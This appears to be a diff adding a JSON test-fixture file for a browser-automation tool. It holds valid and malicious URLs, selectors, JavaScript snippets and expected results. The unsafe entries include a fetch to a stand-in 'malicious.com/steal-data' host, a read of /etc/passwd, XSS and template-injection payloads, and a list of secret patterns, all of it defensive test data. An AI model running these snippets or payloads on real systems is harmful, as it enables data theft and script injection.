@@ -1,0 +1,170 @@
+{
+  "testUrls": {
+    "valid": [
+      "https://example.com",
+      "https://httpbin.org/html",
+      "https://httpbin.org/json",
+      "https://httpbin.org/xml",
+      "https://httpbin.org/robots.txt"
+    ],
+    "invalid": [
+      "not-a-url",
+      "ftp://example.com",
+      "javascript:alert('xss')",
+      "data:text/html,<script>alert('xss')</script>",
+      "file:///etc/passwd"
+    ],
+    "malicious": [
+      "https://malicious-site.com",
+      "https://example.com@malicious.com",
+      "https://example.com.malicious.com",
+      "https://malicious.com/example.com"
+    ]
+  },
+  "testSelectors": {
+    "valid": [
+      "h1",
+      "#main-title",
+      ".container",
+      "input[type='text']",
+      "button:first-child",
+      "div > p",
+      "[data-id='1']"
+    ],
+    "invalid": [
+      "#non-existent",
+      ".missing-class",
+      "invalid-tag",
+      "input[type='nonexistent']"
+    ],
+    "malicious": [
+      "javascript:alert('xss')",
+      "<script>alert('xss')</script>",
+      "eval('alert(\"xss\")')",
+      "${process.env}",
+      "#{7*7}",
+      "{{7*7}}"
+    ]
+  },
+  "testJavaScript": {
+    "safe": [
+      "document.title",
+      "window.location.href",
+      "document.body.innerHTML",
+      "Math.random()",
+      "new Date().toISOString()",
+      "JSON.stringify({test: 'data'})"
+    ],
+    "unsafe": [
+      "require('fs').readFileSync('/etc/passwd')",
+      "process.env",
+      "global.process",
+      "fetch('https://malicious.com/steal-data')",
+      "new XMLHttpRequest()",
+      "while(true) {}",
+      "for(;;) { console.log('spam'); }"
+    ],
+    "memoryIntensive": [
+      "let arr = []; for(let i = 0; i < 1000000; i++) arr.push(i);",
+      "new Array(1000000).fill('memory-test')",
+      "let str = ''; for(let i = 0; i < 1000000; i++) str += 'x';"
+    ]
+  },
+  "testData": {
+    "forms": {
+      "simple": {
+        "textInput": "Test text",
+        "emailInput": "test@example.com",
+        "selectOption": "option1"
+      },
+      "complex": {
+        "textInput": "Complex test data with special chars: !@#$%^&*()",
+        "emailInput": "complex.email+test@example.com",
+        "passwordInput": "SecurePassword123!",
+        "selectOption": "option2",
+        "textareaInput": "This is a long text input\nwith multiple lines\nand special characters: <>&\"'",
+        "checkboxInput": "checked",
+        "radioInput": "radio1"
+      }
+    },
+    "performance": {
+      "smallData": "x".repeat(100),
+      "mediumData": "x".repeat(10000),
+      "largeData": "x".repeat(1000000)
+    }
+  },
+  "expectedResults": {
+    "navigation": {
+      "example.com": {
+        "title": "Example Domain",
+        "status": 200,
+        "hasH1": true
+      },
+      "httpbin.org/html": {
+        "title": "Herman Melville - Moby-Dick",
+        "status": 200,
+        "hasH1": true
+      }
+    },
+    "screenshots": {
+      "minWidth": 100,
+      "minHeight": 100,
+      "maxFileSize": 5000000
+    },
+    "domSnapshot": {
+      "minNodes": 10,
+      "maxNodes": 10000,
+      "requiredProperties": ["tagName", "attributes", "children"]
+    }
+  },
+  "securityTests": {
+    "sensitiveHeaders": [
+      "authorization",
+      "cookie",
+      "x-api-key",
+      "x-auth-token",
+      "x-access-token"
+    ],
+    "sensitivePatterns": [
+      "password",
+      "secret",
+      "token",
+      "key",
+      "api-key",
+      "auth",
+      "credential"
+    ],
+    "maliciousPayloads": [
+      "<script>alert('xss')</script>",
+      "javascript:alert('xss')",
+      "onload=alert('xss')",
+      "eval('alert(\"xss\")')",
+      "${7*7}",
+      "#{7*7}",
+      "{{7*7}}",
+      "<%=7*7%>"
+    ]
+  },
+  "loadTestScenarios": {
+    "light": {
+      "sessions": 3,
+      "operationsPerSession": 5,
+      "duration": 10000
+    },
+    "medium": {
+      "sessions": 10,
+      "operationsPerSession": 10,
+      "duration": 30000
+    },
+    "heavy": {
+      "sessions": 25,
+      "operationsPerSession": 20,
+      "duration": 60000
+    },
+    "stress": {
+      "sessions": 50,
+      "operationsPerSession": 50,
+      "duration": 300000
+    }
+  }
+}
